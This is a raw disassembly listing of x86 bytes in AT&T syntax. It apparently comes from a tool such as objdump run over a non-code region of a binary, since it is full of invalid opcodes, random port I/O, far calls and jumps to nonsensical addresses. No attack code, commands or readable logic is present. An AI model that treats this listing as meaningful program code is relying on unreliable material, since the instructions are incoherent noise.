  406c18:	78 7d                	js     0x406c97
  406c1a:	5d                   	pop    %ebp
  406c1b:	d8 76 ce             	fdivs  -0x32(%esi)
  406c1e:	8e 5b d4             	mov    -0x2c(%ebx),%ds
  406c21:	e5 0c                	in     $0xc,%eax
  406c23:	df c4                	ffreep %st(4)
  406c25:	11 10                	adc    %edx,(%eax)
  406c27:	29 7a c9             	sub    %edi,-0x37(%edx)
  406c2a:	cb                   	lret
  406c2b:	75 33                	jne    0x406c60
  406c2d:	dd 84 98 d0 b4 6e b0 	fldl   -0x4f914b30(%eax,%ebx,4)
  406c34:	31 d0                	xor    %edx,%eax
  406c36:	55                   	push   %ebp
  406c37:	30 c8                	xor    %cl,%al
  406c39:	39 7c 55 1b          	cmp    %edi,0x1b(%ebp,%edx,2)
  406c3d:	d8 a8 20 29 bf aa    	fsubrs -0x5540d6e0(%eax)
  406c43:	c3                   	ret
  406c44:	85 85 4f 21 20 5f    	test   %eax,0x5f20214f(%ebp)
  406c4a:	d8 47 50             	fadds  0x50(%edi)
  406c4d:	50                   	push   %eax
  406c4e:	26 f6 e8             	es imul %al
  406c51:	af                   	scas   %es:(%edi),%eax
  406c52:	e9 58 e3 b6 c9       	jmp    0xc9f74faf
  406c57:	26 74 90             	es je  0x406bea
  406c5a:	ba 5b fa 9a 3c       	mov    $0x3c9afa5b,%edx
  406c5f:	fe                   	(bad)
  406c60:	bc 43 b8 5b 1e       	mov    $0x1e5bb843,%esp
  406c65:	9e                   	sahf
  406c66:	70 83                	jo     0x406beb
  406c68:	81 41 da 38 4f a9 53 	addl   $0x53a94f38,-0x26(%ecx)
  406c6f:	f5                   	cmc
  406c70:	2a a7 db 39 e2 8c    	sub    -0x731dc625(%edi),%ah
  406c76:	d5 a8                	aad    $0xa8
  406c78:	14 8c                	adc    $0x8c,%al
  406c7a:	99                   	cltd
  406c7b:	40                   	inc    %eax
  406c7c:	9a 33 1c a1 3a 29 ee 	lcall  $0xee29,$0x3aa11c33
  406c83:	d8 ae a9 02 2e d0    	fsubrs -0x2fd1fd57(%esi)
  406c89:	da 25 d4 c2 aa 2a    	fisubl 0x2aaac2d4
  406c8f:	11 ee                	adc    %ebp,%esi
  406c91:	f1                   	int1
  406c92:	4c                   	dec    %esp
  406c93:	17                   	pop    %ss
  406c94:	ca 61 55             	lret   $0x5561
  406c97:	53                   	push   %ebx
  406c98:	85 89 cd 45 72 83    	test   %ecx,-0x7c8dba33(%ecx)
  406c9e:	90                   	nop
  406c9f:	69 71 e7 12 88 6e 03 	imul   $0x36e8812,-0x19(%ecx),%esi
  406ca6:	68 a4 bd 34 43       	push   $0x4334bda4
  406cab:	4d                   	dec    %ebp
  406cac:	ae                   	scas   %es:(%edi),%al
  406cad:	16                   	push   %ss
  406cae:	14 91                	adc    $0x91,%al
  406cb0:	14 57                	adc    $0x57,%al
  406cb2:	28 80 85 f4 a2 af    	sub    %al,-0x505d0b7b(%eax)
  406cb8:	ca 27 c7             	lret   $0xc727
  406cbb:	04 52                	add    $0x52,%al
  406cbd:	05 49 d6 28 cb       	add    $0xcb28d649,%eax
  406cc2:	75 29                	jne    0x406ced
  406cc4:	ca 24 b1             	lret   $0xb124
  406cc7:	5e                   	pop    %esi
  406cc8:	dc d0                	(bad)
  406cca:	a0 27 9f 92 1e       	mov    0x1e929f27,%al
  406ccf:	c2 44 ea             	ret    $0xea44
  406cd2:	8a a2 ed eb 08 2e    	mov    0x2e08ebed(%edx),%ah
  406cd8:	53                   	push   %ebx
  406cd9:	6e                   	outsb  %ds:(%esi),(%dx)
  406cda:	7b 79                	jnp    0x406d55
  406cdc:	26 d5 ee             	es aad $0xee
  406cdf:	59                   	pop    %ecx
  406ce0:	fa                   	cli
  406ce1:	78 3a                	js     0x406d1d
  406ce3:	e6 c2                	out    %al,$0xc2
  406ce5:	03 13                	add    (%ebx),%edx
  406ce7:	7a 0a                	jp     0x406cf3
  406ce9:	89 3b                	mov    %edi,(%ebx)
  406ceb:	b9 c0 dc 68 88       	mov    $0x8868dcc0,%ecx
  406cf0:	80 26 99             	andb   $0x99,(%esi)
  406cf3:	41                   	inc    %ecx
  406cf4:	25 24 51 00 54       	and    $0x54005124,%eax
  406cf9:	15 dc 2a 03 82       	adc    $0x82032adc,%eax
  406cfe:	55                   	push   %ebp
  406cff:	5c                   	pop    %esp
  406d00:	63 e3                	arpl   %esp,%ebx
  406d02:	cb                   	lret
  406d03:	86 65 d7             	xchg   %ah,-0x29(%ebp)
  406d06:	98                   	cwtl
  406d07:	ce                   	into
  406d08:	2b 38                	sub    (%eax),%edi
  406d0a:	da 29                	fisubrl (%ecx)
  406d0c:	74 1b                	je     0x406d29
  406d0e:	a8 52                	test   $0x52,%al
  406d10:	50                   	push   %eax
  406d11:	8d 90 79 07 39 04    	lea    0x4390779(%eax),%edx
  406d17:	41                   	inc    %ecx
  406d18:	14 6d                	adc    $0x6d,%al
  406d1a:	3a 04 89             	cmp    (%ecx,%ecx,4),%al
  406d1d:	fc                   	cld
  406d1e:	b5 55                	mov    $0x55,%ch
  406d20:	fa                   	cli
  406d21:	8f                   	(bad)
  406d22:	b0 e5                	mov    $0xe5,%al
  406d24:	05 55 7b fd 5f       	add    $0x5ffd7b55,%eax
  406d29:	3c 39                	cmp    $0x39,%al
  406d2b:	28 b1 ca b0 b5 41    	sub    %dh,0x41b5b0ca(%ecx)
  406d31:	5c                   	pop    %esp
  406d32:	8d b0 47 81 19 e2    	lea    -0x1de67eb9(%eax),%esi
  406d38:	24 57                	and    $0x57,%al
  406d3a:	15 d4 4f a8 97       	adc    $0x97a84fd4,%eax
  406d3f:	a9 b4 9c 65 0b       	test   $0xb659cb4,%eax
  406d44:	c4 77 63             	les    0x63(%edi),%esi
  406d47:	0a 7b bb             	or     -0x45(%ebx),%bh
  406d4a:	2e 3e 13 c7          	cs ds adc %edi,%eax
  406d4e:	6f                   	outsl  %ds:(%esi),(%dx)
  406d4f:	ea e1 c4 06 b5 e5 0b 	ljmp   $0xbe5,$0xb506c4e1
  406d56:	bb 57 9d 62 73       	mov    $0x73629d57,%ebx
  406d5b:	09 91 06 59 f0 46    	or     %edx,0x46f05906(%ecx)
  406d61:	b6 29                	mov    $0x29,%dh
  406d63:	0f 55 76 98          	andnps -0x68(%esi),%xmm6
  406d67:	8a 12                	mov    (%edx),%dl
  406d69:	22 2f                	and    (%edi),%ch
  406d6b:	4c                   	dec    %esp
  406d6c:	57                   	push   %edi
  406d6d:	69 32 65 f6 51 45    	imul   $0x4551f665,(%edx),%esi
  406d73:	fe                   	(bad)
  406d74:	fc                   	cld
  406d75:	16                   	push   %ss
  406d76:	05 0a 95 c7 c9       	add    $0xc9c7950a,%eax
  406d7b:	b0 74                	mov    $0x74,%al
  406d7d:	81 d4 13 de 2e 3a    	adc    $0x3a2ede13,%esp
  406d83:	0a da                	or     %dl,%bl
  406d85:	38 88 df 88 b8 6e    	cmp    %cl,0x6eb888df(%eax)
  406d8b:	e3 2b                	jecxz  0x406db8
  406d8d:	b5 3b                	mov    $0x3b,%ch
  406d8f:	08 fc                	or     %bh,%ah
  406d91:	e3 bf                	jecxz  0x406d52
  406d93:	12 6b af             	adc    -0x51(%ebx),%ch
  406d96:	6c                   	insb   (%dx),%es:(%edi)
  406d97:	59                   	pop    %ecx
  406d98:	38 84 21 17 67 ca 69 	cmp    %al,0x69ca6717(%ecx,%eiz,1)
  406d9f:	fc                   	cld
  406da0:	20 2b                	and    %ch,(%ebx)
  406da2:	7b 95                	jnp    0x406d39
  406da4:	05 d2 51 27 11       	add    $0x112751d2,%eax
  406da9:	0c 54                	or     $0x54,%al
  406dab:	3a 44 da 65          	cmp    0x65(%edx,%ebx,8),%al
  406daf:	7b e3                	jnp    0x406d94
  406db1:	2a bb 91 17 ff 00    	sub    0xff1791(%ebx),%bh
  406db7:	d3 c4                	rol    %cl,%esp
  406db9:	54                   	push   %esp
  406dba:	8d 0d 22 3b 2b a4    	lea    0xa42b3b22,%ecx
  406dc0:	07                   	pop    %es
  406dc1:	eb 92                	jmp    0x406d55
  406dc3:	06                   	push   %es
  406dc4:	07                   	pop    %es
  406dc5:	bc 19 84 84 52       	mov    $0x52848419,%esp
  406dca:	5d                   	pop    %ebp
  406dcb:	48                   	dec    %eax
  406dcc:	cd 22                	int    $0x22
  406dce:	28 b6 04 e1 2e d2    	sub    %dh,-0x2dd11efc(%esi)
  406dd4:	6c                   	insb   (%dx),%es:(%edi)
  406dd5:	55                   	push   %ebp
  406dd6:	15 32 08 d0 aa       	adc    $0xaad00832,%eax
  406ddb:	8a 2e                	mov    (%esi),%ch
  406ddd:	32 a3 82 4e 15 6c    	xor    0x6c154e82(%ebx),%ah
  406de3:	81 27 ad 06 af 86    	andl   $0x86af06ad,(%edi)
  406de9:	50                   	push   %eax
  406dea:	38 ad 93 ae 75 b6    	cmp    %ch,-0x498a516d(%ebp)
  406df0:	3c e0                	cmp    $0xe0,%al
  406df2:	01 82 36 1d 33 11    	add    %eax,0x11331d36(%edx)
  406df8:	54                   	push   %esp
  406df9:	40                   	inc    %eax
  406dfa:	05 50 42 35 25       	add    $0x25354250,%eax
  406dff:	16                   	push   %ss
  406e00:	9c                   	pushf
  406e01:	5f                   	pop    %edi
  406e02:	df 6f c1             	fildll -0x3f(%edi)
  406e05:	7f e6                	jg     0x406ded
  406e07:	e0 66                	loopne 0x406e6f
  406e09:	d1 5b ab             	rcrl   $1,-0x55(%ebx)
  406e0c:	14 3f                	adc    $0x3f,%al
  406e0e:	f6 fc                	idiv   %ah
  406e10:	f6 40 d2 44          	testb  $0x44,-0x2e(%eax)
  406e14:	c2 8e c9             	ret    $0xc98e
  406e17:	01 ab 65 21 ac 89    	add    %ebp,-0x7653de9b(%ebx)
  406e1d:	18 b9 83 69 d2 4c    	sbb    %bh,0x4cd26983(%ecx)
  406e23:	8a a0 2a 7f 39 70    	mov    0x70397f2a(%eax),%ah
  406e29:	39 54 4c 8a          	cmp    %edx,-0x76(%esp,%ecx,2)
  406e2d:	1e                   	push   %ds
  406e2e:	3e 9e                	ds sahf
  406e30:	2a 48 02             	sub    0x2(%eax),%cl
  406e33:	94                   	xchg   %eax,%esp
  406e34:	de 82 05 19 90 28    	fiadds 0x28901905(%edx)
  406e3a:	21 a1 ba cf 54 c7    	and    %esp,-0x38ab3046(%ecx)
  406e40:	b4 a4                	mov    $0xa4,%ah
  406e42:	70 49                	jo     0x406e8d
  406e44:	c4 16                	les    (%esi),%edx
  406e46:	9d                   	popf
  406e47:	35 e8 38 8b 84       	xor    $0x848b38e8,%eax
  406e4c:	23 34 12             	and    (%edx,%edx,1),%esi
  406e4f:	dc eb                	fsubr  %st,%st(3)
  406e51:	82 83 d9 13 b2 09 67 	addb   $0x67,0x9b213d9(%ebx)
  406e58:	c9                   	leave
  406e59:	78 aa                	js     0x406e05
  406e5b:	cc                   	int3
  406e5c:	ae                   	scas   %es:(%edi),%al
  406e5d:	54                   	push   %esp
  406e5e:	35 fb 31 7b 48       	xor    $0x487b31fb,%eax
  406e63:	14 c8                	adc    $0xc8,%al
  406e65:	47                   	inc    %edi
  406e66:	4c                   	dec    %esp
  406e67:	ca 9b fb             	lret   $0xfb9b
  406e6a:	c5 b7 c4 d1 10 b2    	lds    -0x4def2e3c(%edi),%esi
  406e70:	d9 29                	fldcw  (%ecx)
  406e72:	21 a0 01 61 04 00    	and    %esp,0x46101(%eax)
  406e78:	9b                   	fwait
  406e79:	4c                   	dec    %esp
  406e7a:	33 f0                	xor    %eax,%esi
  406e7c:	39 ca                	cmp    %ecx,%edx
  406e7e:	f9                   	stc
  406e7f:	2e ef                	cs out %eax,(%dx)
  406e81:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406e82:	e3 88                	jecxz  0x406e0c
  406e84:	2e 41                	cs inc %ecx
  406e86:	20 e9                	and    %ch,%cl
  406e88:	1e                   	push   %ds
  406e89:	02 81 ad 86 69 52    	add    0x526986ad(%ecx),%al
  406e8f:	cd 36                	int    $0x36
  406e91:	80 9e 4b 7a 89 b4 be 	sbbb   $0xbe,-0x4b7685b5(%esi)
  406e98:	0d 08 01 60 01       	or     $0x1600108,%eax
  406e9d:	48                   	dec    %eax
  406e9e:	57                   	push   %edi
  406e9f:	6b a5 84 ca 61 78 a9 	imul   $0xffffffa9,0x7861ca84(%ebp),%esp
  406ea6:	73 53                	jae    0x406efb
  406ea8:	43                   	inc    %ebx
  406ea9:	94                   	xchg   %eax,%esp
  406eaa:	79 56                	jns    0x406f02
  406eac:	b9 9d 22 31 2d       	mov    $0x2d31229d,%ecx
  406eb1:	15 c7 dc 54 53       	adc    $0x5354dcc7,%eax
  406eb6:	1d a6 60 aa 07       	sbb    $0x7aa60a6,%eax
  406ebb:	85 56 f3             	test   %edx,-0xd(%esi)
  406ebe:	95                   	xchg   %eax,%ebp
  406ebf:	11 ca                	adc    %ecx,%edx
  406ec1:	6d                   	insl   (%dx),%es:(%edi)
  406ec2:	5f                   	pop    %edi
  406ec3:	2d d9 ff 00 d3       	sub    $0xd300ffd9,%eax
  406ec8:	85 26                	test   %esp,(%esi)
  406eca:	11 71 dd             	adc    %esi,-0x23(%ecx)
  406ecd:	a9 83 a8 21 7d       	test   $0x7d21a883,%eax
  406ed2:	d1 1d 94 d0 a0 aa    	rcrl   $1,0xaaa0d094
  406ed8:	27                   	daa
  406ed9:	4c                   	dec    %esp
  406eda:	04 4f                	add    $0x4f,%al
  406edc:	6a 9a                	push   $0xffffff9a
  406ede:	8e e2                	mov    %edx,%fs
  406ee0:	4f                   	dec    %edi
  406ee1:	ba a0 09 77 dd       	mov    $0xdd7709a0,%edx
  406ee6:	9f                   	lahf
  406ee7:	ed                   	in     (%dx),%eax
  406ee8:	d9 7e 3c             	fnstcw 0x3c(%esi)
  406eeb:	78 4a                	js     0x406f37
  406eed:	71 01                	jno    0x406ef0
  406eef:	4e                   	dec    %esi
  406ef0:	70 dc                	jo     0x406ece
  406ef2:	a0 72 22 b9 47       	mov    0x47b92272,%al
  406ef7:	6c                   	insb   (%dx),%es:(%edi)
  406ef8:	2e cf                	cs iret
  406efa:	b4 e2                	mov    $0xe2,%ah
  406efc:	22 13                	and    (%ebx),%dl
  406efe:	62 44 8b b7          	bound  %eax,-0x49(%ebx,%ecx,4)
  406f02:	eb 24                	jmp    0x406f28
  406f04:	51                   	push   %ecx
  406f05:	c2 e7 67             	ret    $0x67e7
  406f08:	96                   	xchg   %eax,%esi
  406f09:	ef                   	out    %eax,(%dx)
  406f0a:	1e                   	push   %ds
  406f0b:	df 18                	fistps (%eax)
  406f0d:	5f                   	pop    %edi
  406f0e:	ea e1 64 c9 94 81 94 	ljmp   $0x9481,$0x94c964e1
  406f15:	5e                   	pop    %esi
  406f16:	27                   	daa
  406f17:	d4 f7                	aam    $0xf7
  406f19:	5c                   	pop    %esp
  406f1a:	c3                   	ret
  406f1b:	68 22 44 0a e8       	push   $0xe80a4422
  406f20:	a2 34 e8 88 f8       	mov    %al,0xf888e834
  406f25:	76 44                	jbe    0x406f6b
  406f27:	71 ac                	jno    0x406ed5
  406f29:	2e 53                	cs push %ebx
  406f2b:	b7 ce                	mov    $0xce,%bh
  406f2d:	7b 22                	jnp    0x406f51
  406f2f:	f7 c7 06 53 9d 7b    	test   $0x7b9d5306,%edi
  406f35:	0c 09                	or     $0x9,%al
  406f37:	cd 4d                	int    $0x4d
  406f39:	3b 20                	cmp    (%eax),%esp
  406f3b:	b9 49 7d f8 6d       	mov    $0x6df87d49,%ecx
  406f40:	83 42 a8 8e          	addl   $0xffffff8e,-0x58(%edx)
  406f44:	99                   	cltd
  406f45:	02 34 c9             	add    (%ecx,%ecx,8),%dh
  406f48:	12 a0 01 e3 2d 22    	adc    0x222de301(%eax),%ah
  406f4e:	a2 ae 1d 70 f3       	mov    %al,0xf3701dae
  406f53:	e4 8b                	in     $0x8b,%al
  406f55:	ff 00                	incl   (%eax)
  406f57:	b6 78                	mov    $0x78,%dh
  406f59:	68 29 ca a3 28       	push   $0x28a3ca29
  406f5e:	56                   	push   %esi
  406f5f:	63 0a                	arpl   %ecx,(%edx)
  406f61:	92                   	xchg   %eax,%edx
  406f62:	34 89                	xor    $0x89,%al
  406f64:	64 37                	fs aaa
  406f66:	e4 2a                	in     $0x2a,%al
  406f68:	2d 3e 58 13 e6       	sub    $0xe613583e,%eax
  406f6d:	ae                   	scas   %es:(%edi),%al
  406f6e:	e5 d4                	in     $0xd4,%eax
  406f70:	e9 6e 46 49 0d       	jmp    0xd89b5e3
  406f75:	76 10                	jbe    0x406f87
  406f77:	90                   	nop
  406f78:	27                   	daa
  406f79:	66 70 e1             	data16 jo 0x406f5d
  406f7c:	67 1d b0 24 84 1b    	addr16 sbb $0x1b8424b0,%eax
  406f82:	47                   	inc    %edi
  406f83:	83 25 45 32 ce 28 1a 	andl   $0x1a,0x28ce3245
  406f8a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406f8b:	21 94 30 dc 10 c2 3b 	and    %edx,0x3bc210dc(%eax,%esi,1)
  406f92:	84 4d b2             	test   %cl,-0x4e(%ebp)
  406f95:	eb 2d                	jmp    0x406fc4
  406f97:	b6 c2                	mov    $0xc2,%dh
  406f99:	ab                   	stos   %eax,%es:(%edi)
  406f9a:	fd                   	std
  406f9b:	27                   	daa
  406f9c:	9b                   	fwait
  406f9d:	92                   	xchg   %eax,%edx
  406f9e:	06                   	push   %es
  406f9f:	02 46 44             	add    0x44(%esi),%al
  406fa2:	68 69 8c b4 2b       	push   $0x2bb48c69
  406fa7:	b4 7b                	mov    $0x7b,%ah
  406fa9:	2e e0 ef             	loopne,pn 0x406f9b
  406fac:	f0 3c 3a             	lock cmp $0x3a,%al
  406faf:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406fb0:	94                   	xchg   %eax,%esp
  406fb1:	78 52                	js     0x407005
  406fb3:	04 c0                	add    $0xc0,%al
  406fb5:	5f                   	pop    %edi
  406fb6:	41                   	inc    %ecx
  406fb7:	c4                   	(bad)
  406fb8:	d0 34 7d 66 84 ad b0 	shlb   $1,-0x4f527b9a(,%edi,2)
  406fbf:	9f                   	lahf
  406fc0:	65 98                	gs cwtl
  406fc2:	ef                   	out    %eax,(%dx)
  406fc3:	09 11                	or     %edx,(%ecx)
  406fc5:	0a 18                	or     (%eax),%bl
  406fc7:	33 81 34 57 14 11    	xor    0x11145734(%ecx),%eax
  406fcd:	49                   	dec    %ecx
  406fce:	70 e2                	jo     0x406fb2
  406fd0:	21 a6 77 22 e3 ff    	and    %esp,-0x1cdd89(%esi)
  406fd6:	00 a7 8b 87 60 28    	add    %ah,0x2860878b(%edi)
  406fdc:	1a d1                	sbb    %cl,%dl
  406fde:	48                   	dec    %eax
  406fdf:	97                   	xchg   %eax,%edi
  406fe0:	45                   	inc    %ebp
  406fe1:	ba bd 68 e0 35       	mov    $0x35e068bd,%edx
  406fe6:	1a ae d6 84 9c 71    	sbb    0x719c84d6(%esi),%ch
  406fec:	f5                   	cmc
  406fed:	7e 40                	jle    0x40702f
  406fef:	00 be db 8b d5 54    	add    %bh,0x54d58bdb(%esi)
  406ff5:	0c 6d                	or     $0x6d,%al
  406ff7:	47                   	inc    %edi
  406ff8:	05 01 3f 29 07       	add    $0x7293f01,%eax
  406ffd:	e3 1d                	jecxz  0x40701c
  406fff:	8b 6f 6c             	mov    0x6c(%edi),%ebp
  407002:	71 26                	jno    0x40702a
  407004:	69 a0 a6 f5 c7 58 85 	imul   $0x81f4585,0x58c7f5a6(%eax),%esp
  40700b:	45 1f 08 
  40700e:	92                   	xchg   %eax,%edx
  40700f:	3f                   	aas
  407010:	2b 74 5c 1b          	sub    0x1b(%esp,%ebx,2),%esi
  407014:	3f                   	aas
  407015:	9a ea 97 45 fe ca a4 	lcall  $0xa4ca,$0xfe4597ea
  40701c:	49                   	dec    %ecx
  40701d:	d9 01                	flds   (%ecx)
  40701f:	11 3c 90             	adc    %edi,(%eax,%edx,4)
  407022:	33 b9 33 f0 98 f2    	xor    -0xd670fcd(%ecx),%edi
  407028:	e2 19                	loop   0x407043
  40702a:	81 a0 ad f1 22 5e f6 	andl   $0xc82e47f6,0x5e22f1ad(%eax)
  407031:	47 2e c8 
  407034:	86 bf 3a 40 89 b2    	xchg   %bh,-0x4d76bfc6(%edi)
  40703a:	88 21                	mov    %ah,(%ecx)
  40703c:	b1 7c                	mov    $0x7c,%cl
  40703e:	f7 6c 45 45          	imull  0x45(%ebp,%eax,2)
  407042:	cf                   	iret
  407043:	d4 06                	aam    $0x6
  407045:	99                   	cltd
  407046:	43                   	inc    %ebx
  407047:	1d cb dd 7b 22       	sbb    $0x227bddcb,%eax
  40704c:	fd                   	std
  40704d:	2b c4                	sub    %esp,%eax
  40704f:	6f                   	outsl  %ds:(%esi),(%dx)
  407050:	d7                   	xlat   %ds:(%ebx)
  407051:	21 92 c5 4b 69 71    	and    %edx,0x71694bc5(%edx)
  407057:	88 55 52             	mov    %dl,0x52(%ebp)
  40705a:	53                   	push   %ebx
  40705b:	82 8b bb 24 64 a6 39 	orb    $0x39,-0x599bdb45(%ebx)
  407062:	42                   	inc    %edx
  407063:	4f                   	dec    %edi
  407064:	a9 13 25 95 4e       	test   $0x4e952513,%eax
  407069:	dd 2f                	(bad) (%edi)
  40706b:	db ba aa 7e 9e 15    	fstpt  0x159e7eaa(%edx)
  407071:	9c                   	pushf
  407072:	48                   	dec    %eax
  407073:	d4 eb                	aam    $0xeb
  407075:	e7 7a                	out    %eax,$0x7a
  407077:	18 42 2a             	sbb    %al,0x2a(%edx)
  40707a:	2d e5 0c 00 e2       	sub    $0xe2000ce5,%eax
  40707f:	3c 5b                	cmp    $0x5b,%al
  407081:	4c                   	dec    %esp
  407082:	bf 29 c1 52 dc       	mov    $0xdc52c129,%edi
  407087:	82 83 b4 b3 dc 90 31 	addb   $0x31,-0x6f234c4c(%ebx)
  40708e:	f2 8b b9 11 53 ed c2 	repnz mov -0x3d12acef(%ecx),%edi
  407095:	95                   	xchg   %eax,%ebp
  407096:	56                   	push   %esi
  407097:	3d 8b 07 15 a6       	cmp    $0xa615078b,%eax
  40709c:	62 86 3b d9 46 90    	bound  %eax,-0x6fb926c5(%esi)
  4070a2:	57                   	push   %edi
  4070a3:	26 e2 2a             	es loop 0x4070d0
  4070a6:	92                   	xchg   %eax,%edx
  4070a7:	aa                   	stos   %al,%es:(%edi)
  4070a8:	fd                   	std
  4070a9:	f3 f6 42 f2 05       	repz testb $0x5,-0xe(%edx)
  4070ae:	fd                   	std
  4070af:	28 9f b7 ef 8e 2a    	sub    %bl,0x2a8eefb7(%edi)
  4070b5:	48                   	dec    %eax
  4070b6:	1e                   	push   %ds
  4070b7:	8f                   	(bad)
  4070b8:	e7 e3                	out    %eax,$0xe3
  4070ba:	ef                   	out    %eax,(%dx)
  4070bb:	89 8a fb 11 e6 9a    	mov    %ecx,-0x6519ee05(%edx)
  4070c1:	91                   	xchg   %eax,%ecx
  4070c2:	bb ea 05 f1 50       	mov    $0x50f105ea,%ebx
  4070c7:	44                   	inc    %esp
  4070c8:	54                   	push   %esp
  4070c9:	ef                   	out    %eax,(%dx)
  4070ca:	f0 a8 8a             	lock test $0x8a,%al
  4070cd:	a3 d9 3f bf ed       	mov    %eax,0xedbf3fd9
  4070d2:	c7                   	(bad)
  4070d3:	30 a6 8d 53 a4 6e    	xor    %ah,0x6ea4538d(%esi)
  4070d9:	b1 05                	mov    $0x5,%cl
  4070db:	4f                   	dec    %edi
  4070dc:	84 39                	test   %bh,(%ecx)
  4070de:	4e                   	dec    %esi
  4070df:	e9 8a 36 83 b5       	jmp    0xb5c3a76e
  4070e4:	05 51 15 53 04       	add    $0x4531551,%eax
  4070e9:	8a 29                	mov    (%ecx),%ch
  4070eb:	df 0b                	fisttps (%ebx)
  4070ed:	8f                   	(bad)
  4070ee:	8f                   	(bad)
  4070ef:	8f                   	(bad)
  4070f0:	d9 7f f2             	fnstcw -0xe(%edi)
  4070f3:	f1                   	int1
  4070f4:	67 a5                	movsl  %ds:(%si),%es:(%di)
  4070f6:	16                   	push   %ss
  4070f7:	9a 45 17 8b c6 3f 29 	lcall  $0x293f,$0xc68b1745
  4070fe:	13 a4 d1 ea f0 aa f1 	adc    -0xe550f16(%ecx,%edx,8),%esp
  407105:	c1 97 fd 83 8d 4b e9 	rcll   $0xe9,0x4b8d83fd(%edi)
  40710c:	3e 24 ac             	ds and $0xac,%al
  40710f:	3a d0                	cmp    %al,%dl
  407111:	16                   	push   %ss
  407112:	4d                   	dec    %ebp
  407113:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407114:	5a                   	pop    %edx
  407115:	03 12                	add    (%edx),%edx
  407117:	20 51 52             	and    %dl,0x52(%ecx)
  40711a:	45                   	inc    %ebp
  40711b:	44                   	inc    %esp
  40711c:	2e fc                	cs cld
  40711e:	4c                   	dec    %esp
  40711f:	89 8d 2a 74 b9 aa    	mov    %ecx,-0x55468bd6(%ebp)
  407125:	2f                   	das
  407126:	b0 dd                	mov    $0xdd,%al
  407128:	9e                   	sahf
  407129:	87 c2                	xchg   %eax,%edx
  40712b:	91                   	xchg   %eax,%ecx
  40712c:	e9 80 3c b6 1c       	jmp    0x1cf6adb1
  407131:	37                   	aaa
  407132:	45                   	inc    %ebp
  407133:	bd bd 60 c3 be       	mov    $0xbec360bd,%ebp
  407138:	ad                   	lods   %ds:(%esi),%eax
  407139:	b8 b1 23 8a 51       	mov    $0x518a23b1,%eax
  40713e:	e2 4d                	loop   0x40718d
  407140:	6a 3d                	push   $0x3d
  407142:	52                   	push   %edx
  407143:	85 4f 1d             	test   %ecx,0x1d(%edi)
  407146:	d2 19                	rcrb   %cl,(%ecx)
  407148:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407149:	5c                   	pop    %esp
  40714a:	6e                   	outsb  %ds:(%esi),(%dx)
  40714b:	b0 cb                	mov    $0xcb,%al
  40714d:	64 49                	fs dec %ecx
  40714f:	30 ff                	xor    %bh,%bh
  407151:	00 31                	add    %dh,(%ecx)
  407153:	21 9b 24 2c 10 a0    	and    %ebx,-0x5fefd3dc(%ebx)
  407159:	20 a8 38 07 84 36    	and    %ch,0x36840738(%eax)
  40715f:	51                   	push   %ecx
  407160:	57                   	push   %edi
  407161:	af                   	scas   %es:(%edi),%eax
  407162:	c5 4b 4c             	lds    0x4c(%ebx),%ecx
  407165:	6e                   	outsb  %ds:(%esi),(%dx)
  407166:	19 65 83             	sbb    %esp,-0x7d(%ebp)
  407169:	d1 86 de 40 34 59    	roll   $1,0x593440de(%esi)
  40716f:	84 76 eb             	test   %dh,-0x15(%esi)
  407172:	98                   	cwtl
  407173:	dd 3e                	fnstsw (%esi)
  407175:	16                   	push   %ss
  407176:	9d                   	popf
  407177:	56                   	push   %esi
  407178:	32 e5                	xor    %ch,%ah
  40717a:	b9 95 32 b9 dc       	mov    $0xdcb93295,%ecx
  40717f:	ba d3 b3 53 fc       	mov    $0xfc53b3d3,%edx
  407184:	c7 c2 2b 57 f8 69    	mov    $0x69f8572b,%edx
  40718a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40718b:	69 ca e4 89 04 cc    	imul   $0xcc0489e4,%edx,%ecx
  407191:	ee                   	out    %al,(%dx)
  407192:	ab                   	stos   %eax,%es:(%edi)
  407193:	cc                   	int3
  407194:	c4 10                	les    (%eax),%edx
  407196:	dc 51 e4             	fcoml  -0x1c(%ecx)
  407199:	3b 10                	cmp    (%eax),%edx
  40719b:	c9                   	leave
  40719c:	a9 4c 38 a2 99       	test   $0x99a2384c,%eax
  4071a1:	62 47 5c             	bound  %eax,0x5c(%edi)
  4071a4:	49                   	dec    %ecx
  4071a5:	05 c4 f0 21 22       	add    $0x2221f0c4,%eax
  4071aa:	5c                   	pop    %esp
  4071ab:	8e 78 e6             	mov    -0x1a(%eax),%?
  4071ae:	8e 1a                	mov    (%edx),%ds
  4071b0:	92                   	xchg   %eax,%edx
  4071b1:	c1 2c 03 31          	shrl   $0x31,(%ebx,%eax,1)
  4071b5:	a2 d2 b9 91 a8       	mov    %al,0xa891b9d2
  4071ba:	39 64 7b 0e          	cmp    %esp,0xe(%ebx,%edi,2)
  4071be:	91                   	xchg   %eax,%ecx
  4071bf:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4071c0:	26 92                	es xchg %eax,%edx
  4071c2:	68 2b 48 40 15       	push   $0x1540482b
  4071c7:	39 0d 39 19 63 9b    	cmp    %ecx,0x9b631939
  4071cd:	c3                   	ret
  4071ce:	53                   	push   %ebx
  4071cf:	46                   	inc    %esi
  4071d0:	c2 1c 82             	ret    $0x821c
  4071d3:	22 1c 3e             	and    (%esi,%edi,1),%bl
  4071d6:	8c 29                	mov    %gs,(%ecx)
  4071d8:	03 44 4e 0e          	add    0xe(%esi,%ecx,2),%eax
  4071dc:	10 9c 04 51 0c aa 22 	adc    %bl,0x22aa0c51(%esp,%eax,1)
  4071e3:	28 82 65 4d 7b f0    	sub    %al,-0xf84b29b(%edx)
  4071e9:	2b d8                	sub    %eax,%ebx
  4071eb:	5a                   	pop    %edx
  4071ec:	25 93 d2 11 9e       	and    $0x9e11d293,%eax
  4071f1:	71 e3                	jno    0x4071d6
  4071f3:	46                   	inc    %esi
  4071f4:	3b d9                	cmp    %ecx,%ebx
  4071f6:	c3                   	ret
  4071f7:	f5                   	cmc
  4071f8:	1e                   	push   %ds
  4071f9:	f1                   	int1
  4071fa:	ab                   	stos   %eax,%es:(%edi)
  4071fb:	52                   	push   %edx
  4071fc:	50                   	push   %eax
  4071fd:	e2 4c                	loop   0x40724b
  4071ff:	16                   	push   %ss
  407200:	66 53                	push   %bx
  407202:	dd 13                	fstl   (%ebx)
  407204:	8f                   	(bad)
